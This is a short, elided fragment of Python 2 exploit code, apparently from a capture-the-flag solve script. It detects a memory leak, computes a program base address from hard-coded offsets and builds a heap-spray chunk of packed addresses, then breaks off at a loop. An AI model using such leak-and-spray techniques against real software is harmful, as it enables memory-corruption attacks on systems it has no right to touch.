...
while 1:
    ...
    if  data.index("- menu -") > 10:
        ...
        print "[*]Hit!"
        leak_bin = data[:6]
        binary = u64(leak_bin.ljust(8, "\x00")) - 0x1258
        print hex(binary)
        ...
        spray_chunk = p64(binary + 0x12bd) + p64(0x121) + p64(binary + 0x202090) + p64(0x100)
        for x in range(8):
